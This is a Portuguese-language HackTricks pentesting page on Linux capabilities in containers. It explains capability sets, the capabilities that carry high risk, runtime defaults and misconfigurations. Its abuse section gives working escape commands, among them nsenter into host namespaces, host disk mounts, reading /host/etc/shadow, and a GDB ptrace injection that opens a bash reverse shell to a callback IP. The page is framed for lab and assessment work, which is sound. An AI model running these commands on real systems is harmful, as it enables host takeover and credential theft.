# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

As capabilities do Linux são um dos elementos mais importantes da container security porque respondem a uma pergunta sutil, mas fundamental: **o que "root" realmente significa dentro de um container?** Em um sistema Linux normal, o UID 0 historicamente implicava um conjunto muito amplo de privilégios. Nos kernels modernos, esse privilégio é decomposto em unidades menores chamadas capabilities. Um processo pode ser executado como root e ainda não ter muitas operações poderosas se as capabilities relevantes tiverem sido removidas. <sup>[[1]](#references)</sup>

Os containers dependem muito dessa distinção. Muitas workloads ainda são iniciadas como UID 0 dentro do container por motivos de compatibilidade ou simplicidade. Sem o drop de capabilities, isso seria perigoso demais. Com o drop de capabilities, um processo root em um container ainda pode executar muitas tarefas comuns dentro do container, enquanto tem negado o acesso a operações mais sensíveis do kernel. É por isso que um shell de container que exibe `uid=0(root)` não significa automaticamente "host root" ou sequer "privilégio amplo sobre o kernel". Os conjuntos de capabilities determinam quanto essa identidade root realmente vale.

Para obter a referência completa das capabilities do Linux e muitos exemplos de abuso, consulte:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operação

As capabilities são rastreadas em vários conjuntos, incluindo permitted, effective, inheritable, ambient e bounding sets. Para muitas avaliações de containers, a semântica exata de cada conjunto no kernel é menos importante de imediato do que a pergunta prática final: **quais operações privilegiadas este processo consegue executar agora e quais ganhos futuros de privilégio ainda são possíveis?** <sup>[[1]](#references)</sup>

Isso é importante porque muitas técnicas de breakout são, na realidade, problemas de capabilities disfarçados de problemas de containers. Uma workload com `CAP_SYS_ADMIN` pode acessar uma enorme quantidade de funcionalidades do kernel que um processo root normal de um container não deveria acessar. Uma workload com `CAP_NET_ADMIN` torna-se muito mais perigosa se também compartilhar o host network namespace. Uma workload com `CAP_SYS_PTRACE` torna-se muito mais interessante se puder visualizar processos do host por meio do compartilhamento do host PID. No Docker ou Podman, isso pode aparecer como `--pid=host`; no Kubernetes, normalmente aparece como `hostPID: true`.

Em outras palavras, o conjunto de capabilities não pode ser avaliado isoladamente. Ele precisa ser analisado em conjunto com namespaces, seccomp e políticas MAC.

## Lab

Uma maneira muito direta de inspecionar as capabilities dentro de um container é:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Você também pode comparar um container mais restritivo com um que tenha todas as capabilities adicionadas:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver o efeito de uma adição restrita, tente remover tudo e adicionar novamente apenas uma capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Esses pequenos experimentos ajudam a mostrar que um runtime não está simplesmente alternando um booleano chamado "privileged". Ele está moldando a superfície de privilégios real disponível para o processo.

## Capabilities de Alto Risco

As capabilities tornam-se primitivas de escape somente quando sua operação alcança um **recurso governado pelo host**. As combinações recorrentes de alto risco são:

- **`CAP_SYS_ADMIN`** mais um PID, block device ou caminho de controle do kernel gravável do host. Entrar em um mount namespace alvo também requer `CAP_SYS_CHROOT`; montar um filesystem baseado em block device requer `CAP_SYS_ADMIN` no initial user namespace.
- **`CAP_SYS_PTRACE`** mais visibilidade dos PIDs do host e um processo do host ao qual seja possível realizar attach. `CAP_SYS_ADMIN` não é necessário para ptrace injection.
- **`CAP_DAC_OVERRIDE` ou `CAP_DAC_READ_SEARCH`** mais um filesystem do host alcançável. Essas capabilities ignoram verificações DAC diferentes, mas não criam uma visão do filesystem do host.
- **`CAP_SYS_MODULE`** no initial user namespace mais um módulo aceito e compatível com o kernel. Containers Linux comuns compartilham o kernel do node; runtimes baseados em VM ou userspace-kernel alteram esse limite.
- **`CAP_MKNOD`** no initial user namespace mais um dispositivo real do host que o device cgroup já permita. Criar um node não ignora o device cgroup.
- **`CAP_SYS_RAWIO`** mais uma interface de memória, I/O-port, PCI ou controle de dispositivo exposta e utilizável.
- **`CAP_SYS_BOOT`** mais o initial PID namespace para um reboot do host, ou um caminho de kexec utilizável e permitido para substituição do kernel.
- **`CAP_NET_ADMIN`** no host network namespace para controle direto do estado de rede do node. **`CAP_NET_RAW`** pode participar de um escape específico de protocolo, mas raw sockets sozinhos não são um shell no node.

`CAP_SYS_CHROOT` deliberadamente não está listado como uma capability de escape independente. Ela pode ser necessária pelo `setns()` de um mount namespace e pode facilitar o uso de uma árvore do host já acessível, mas `chroot()` sozinho não expõe essa árvore nem concede novas permissões no filesystem. Da mesma forma, `CAP_BPF` e `CAP_PERFMON` expõem uma poderosa superfície de telemetry e ataque do kernel, mas, na ausência de uma falha independente no kernel, suas operações normais não são escapes genéricos de container.

## Uso pelo Runtime

Docker, Podman, stacks baseadas em containerd e CRI-O usam controles de capabilities, mas os defaults e as interfaces de gerenciamento diferem. Docker os expõe diretamente por meio de flags como `--cap-drop` e `--cap-add`. Podman expõe controles semelhantes e normalmente os combina com execução rootless como uma camada adicional de segurança. Kubernetes apresenta adições e remoções de capabilities por meio do `securityContext` do Pod ou do container; runtimes de nível inferior expressam os conjuntos resultantes na configuração do runtime OCI. Ambientes de system containers, como LXC e Incus, também dependem do controle de capabilities, mas sua integração mais ampla com o host pode levar operadores a relaxar os defaults de forma mais agressiva do que fariam para um application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

O mesmo princípio vale para todos eles: uma capability que é tecnicamente possível conceder não é necessariamente uma capability que deveria ser concedida. Muitos incidentes do mundo real começam quando um operador adiciona uma capability simplesmente porque um workload falhou sob uma configuração mais restrita e a equipe precisava de uma correção rápida.

## Misconfigurations

O erro mais óbvio é **`--cap-add=ALL`** em CLIs no estilo Docker/Podman, mas não é o único. Na prática, um problema mais comum é conceder uma ou duas capabilities extremamente poderosas, especialmente `CAP_SYS_ADMIN`, para "fazer a aplicação funcionar" sem também compreender as implicações de namespaces, seccomp e mounts. Outro modo comum de falha é combinar capabilities adicionais com o compartilhamento de host namespaces. No Docker ou Podman, isso pode aparecer como `--pid=host`, `--network=host` ou `--userns=host`; no Kubernetes, a exposição equivalente geralmente aparece por meio de configurações do workload, como `hostPID: true` ou `hostNetwork: true`. Cada uma dessas combinações altera o que a capability pode realmente afetar.

Também é comum ver administradores acreditarem que, como um workload não é totalmente `--privileged`, ele ainda está significativamente restrito. Às vezes isso é verdade, mas às vezes a postura efetiva já está próxima o suficiente de privileged para que a distinção deixe de importar operacionalmente.

## Abuso

Comece registrando os conjuntos efetivos, o mapeamento do user namespace, o estado do seccomp, os namespaces, os mounts e os devices. O nome de uma capability sem esse contexto não comprova um escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces e dispositivos de bloco

Com visibilidade dos PIDs do host, `CAP_SYS_ADMIN` pode entrar nos namespaces do host. A operação de namespace de montagem também requer `CAP_SYS_CHROOT` no user namespace do chamador.

**Verifique a capability e o confinamento:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumere o alvo:** confirme o compartilhamento de PID do host a partir da configuração do container/Pod ou de uma lista inequívoca de processos do host; em seguida, inspecione os namespaces do alvo. Um PID 1 local também existe em namespaces de PID privados, portanto, sua presença isolada não comprova o compartilhamento de PID do host.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Explore o caminho do namespace:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
As verificações de capabilities devem ser bem-sucedidas nos user namespaces que possuem os alvos. `--pid=host` ou o Kubernetes `hostPID: true` fornece visibilidade; não fornece as capabilities.

Para o caminho alternativo de block device, **enumere** os candidatos e, em seguida, **explore** o filesystem acessível montando primeiro o candidato validado no modo somente leitura:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
O nó de dispositivo deve existir, o cgroup de dispositivos deve permiti-lo, e as montagens de block-filesystem exigem `CAP_SYS_ADMIN` no user namespace inicial. Uma raiz do host já montada via bind em `/host` fornece acesso ao host **sem** `CAP_SYS_ADMIN`; `chroot /host` é apenas uma conveniência e exige separadamente `CAP_SYS_CHROOT`.

### Raiz do host acessível: execução direta do filesystem

Se a raiz do host já estiver montada em `/host`, primeiro confirme a montagem e, em seguida, use diretamente o acesso existente. Esse caminho não depende de `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Se `chroot()` não estiver disponível, mas o binário do host for compatível com a arquitetura e o loader do container, ele geralmente poderá ser chamado por meio da árvore montada:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Leituras e gravações diretas em `/host` já representam um comprometimento do sistema de arquivos do host. `chroot()` ou a execução de um binário do host apenas tornam esse acesso mais conveniente; nenhuma dessas operações cria a montagem do host ou ignora uma montagem somente leitura ou uma política MAC.

### `CAP_SYS_PTRACE`: injeção em processos do host

Com visibilidade dos PIDs do host e `CAP_SYS_PTRACE` no user namespace do alvo, o GDB pode fazer um processo do host aprovado chamar `system()`. `CAP_SYS_ADMIN` não é necessário.

**Verifique a capability e os controles de attachment:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Enumere e selecione um alvo descartável:** confirme o compartilhamento de PID do host pela configuração ou por uma lista inequívoca de processos do nó; nunca selecione o PID 1 ou um daemon crítico.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Explorar o processo selecionado:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
O alvo deve permitir anexação e ter um símbolo `system()` utilizável e um caminho para o payload do Bash. Yama, o estado non-dumpable, seccomp, user namespaces e a política MAC podem bloquear a cadeia. O GDB interrompe o alvo enquanto está anexado, portanto use apenas um processo descartável em um laboratório.

### `CAP_DAC_OVERRIDE` e `CAP_DAC_READ_SEARCH`: arquivos protegidos do host

Essas capabilities não expõem o filesystem do host. Se `/host` já for um mount do host, `CAP_DAC_READ_SEARCH` poderá ignorar as verificações DAC de leitura/pesquisa, e `CAP_DAC_OVERRIDE` poderá adicionalmente ignorar as verificações comuns de escrita:

**Verifique as capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumere o sistema de arquivos exposto do host e as permissões do alvo:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Teste os bypasses de leitura e escrita** em um laboratório descartável:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Um mount somente leitura e as regras do LSM ainda se aplicam. `CAP_DAC_READ_SEARCH` também autoriza `open_by_handle_at()`, mas um breakout como o Shocker precisa adicionalmente de um descritor de arquivo de mount para o mesmo filesystem subjacente, handles válidos ou que possam ser descobertos, um layout de filesystem/storage compatível e nenhuma restrição do runtime ou do LSM. Ele não fornece acesso arbitrário a todos os filesystems fora do namespace de mount.

### `CAP_SYS_MODULE`: execução no kernel compartilhado

Em um container Linux comum, um módulo aceito é executado no kernel compartilhado do host.

**Verifique a capability e o escopo do user namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumere os pré-requisitos para o carregamento de módulos:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Exploit apenas com um módulo de prova compatível e previamente revisado em um nó descartável:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
A capability deve estar efetiva no user namespace inicial. A versão e a configuração do kernel, as assinaturas dos módulos, o lockdown, o seccomp e a política do LSM devem permitir o carregamento. Kata, gVisor, isolamento do Hyper-V e runtimes semelhantes alteram qual limite do kernel é alcançado pelo workload.

### `CAP_MKNOD`: criar um handle de dispositivo permitido

`CAP_MKNOD` cria um device node, mas não ignora o device cgroup. A criação de dispositivos não é namespaced, portanto a capability deve estar efetiva no user namespace inicial.

**Verifique a capability e o escopo do user namespace:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumere os dispositivos reais, seus números major/minor e qualquer allowlist de cgroup-v1 visível:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Explore uma leitura somente leitura de um candidato da família ext validado:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Outros sistemas de arquivos precisam de uma ferramenta correspondente somente para leitura; montar o dispositivo também requer `CAP_SYS_ADMIN`. `Operation not permitted` ao abrir o node criado geralmente indica que o cgroup de dispositivos ainda o bloqueia. No cgroup v2, o acesso a dispositivos é normalmente imposto com BPF, e nenhum arquivo `devices.list` existe, portanto uma abertura bem-sucedida é o teste decisivo.

### `CAP_SYS_RAWIO`: interface de raw-I/O exposta

Não existe um payload genérico portátil: os endereços válidos e os efeitos dependem do hardware e da configuração do kernel.

**Verifique a capability e o escopo do user namespace:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumere as interfaces raw, o hardware e os drivers expostos:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit somente com uma prova aprovada para o dispositivo e o intervalo de endereços identificados.** Se `/dev/mem` for a interface aprovada pelo laboratório, este modelo comprova a divulgação da memória do nó sem imprimir seu conteúdo:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
O endereço deve vir do mapa de hardware do lab, porque a leitura de algumas regiões MMIO pode causar efeitos colaterais. Um comando genérico de gravação na memória seria enganoso e inseguro: o mesmo endereço pode ser inofensivo em uma máquina e controlar hardware ou memória do kernel em outra. cgroups de dispositivos, permissões do sistema de arquivos, `/dev/mem` restrito, kernel lockdown, virtualização e políticas de LSM normalmente impedem um acesso útil.

### `CAP_SYS_BOOT`: reboot do namespace ou substituição do kernel

Em um namespace PID privado, `reboot()` encerra o processo init desse namespace em vez de reiniciar o host. Portanto, o impacto de um reboot do host exige o namespace PID inicial, normalmente por meio do compartilhamento de PID do host. Um caminho de kexec também exige uma imagem de kernel compatível e uma política permissiva de lockdown/assinatura:

**Verifique a capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumere os pré-requisitos de PID-namespace e kexec:** confirme o compartilhamento de PID do host na configuração da workload, pois um link para um PID namespace, por si só, não revela se ele é o namespace inicial do node.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Use o exploit somente quando reiniciar um node descartável de laboratório for o exercício explícito:**
```bash
sync
reboot -f
```
Não execute esse comando nem carregue um kernel em um node compartilhado apenas para comprovar a capability. Em um PID namespace privado, ele encerra apenas o processo init desse namespace e não demonstra impacto no host.

### `CAP_NET_ADMIN` e `CAP_NET_RAW`: caminhos de rede do host

`CAP_NET_ADMIN` afeta apenas o network namespace atual.

**Verifique as capabilities e o confinement:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumere a rede atual e confirme a rede do host na configuração da carga de trabalho:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Exercer `CAP_NET_ADMIN` de forma reversível:** com a rede do host, a interface temporária é uma interface do nó.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` permite sockets RAW e PACKET, mas não fornece um shell genérico no host. Para **enumerar** a cadeia documentada do GCE, verifique a rota de metadata e capture se o tráfego não criptografado do guest-agent pode ser observado:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Se os pré-requisitos correspondentes existirem, **exploit** a chain específica do ambiente conforme documentado em [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): capture o estado da requisição e da sequência, injete a resposta de metadata forjada contendo uma chave SSH e, em seguida, valide o acesso ao host. A chain exigia root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, tráfego de metadata do GCE em texto claro e uma requisição do guest-agent sujeita a uma race; comportamentos modernos de transporte ou do agent podem interrompê-la.

## Verificações

O objetivo das verificações de capabilities não é apenas despejar valores brutos, mas entender se o processo tem privilégios suficientes para tornar perigosas a namespace e a situação de mount atuais.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
O que é interessante aqui:

- `capsh --print` é a maneira mais fácil de identificar capabilities de alto risco, como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- A linha `CapEff` em `/proc/self/status` informa o que está efetivamente ativo agora, não apenas o que pode estar disponível em outros conjuntos.
- Um dump de capabilities se torna muito mais importante se o container também compartilhar namespaces de PID, rede ou usuário do host, ou tiver mounts do host com permissão de escrita.

Depois de coletar as informações brutas sobre as capabilities, o próximo passo é a interpretação. Verifique se o processo é root, se os user namespaces estão ativos, se os namespaces do host são compartilhados, se o seccomp está sendo aplicado e se o AppArmor ou o SELinux ainda restringem o processo. Um conjunto de capabilities, por si só, é apenas parte da história, mas frequentemente é a parte que explica por que um container breakout funciona e outro falha com o mesmo ponto de partida aparente.

## Padrões de Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Conjunto reduzido de capabilities por padrão | O Docker mantém uma allowlist padrão de capabilities e remove as demais | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto reduzido de capabilities por padrão | Os containers do Podman não são privilegiados por padrão e usam um modelo reduzido de capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Herda os padrões do runtime, a menos que sejam alterados | Se nenhum `securityContext.capabilities` for especificado, o container recebe o conjunto padrão de capabilities do runtime | `securityContext.capabilities.add`, não usar `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O sob Kubernetes | Geralmente o padrão do runtime | O conjunto efetivo depende do runtime e da especificação do Pod | igual à linha do Kubernetes; a configuração direta de OCI/CRI também pode adicionar capabilities explicitamente |

Para o Kubernetes, o ponto importante é que a API não define um único conjunto universal padrão de capabilities. Se o Pod não adicionar nem remover capabilities, a workload herda o padrão do runtime daquele node.

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
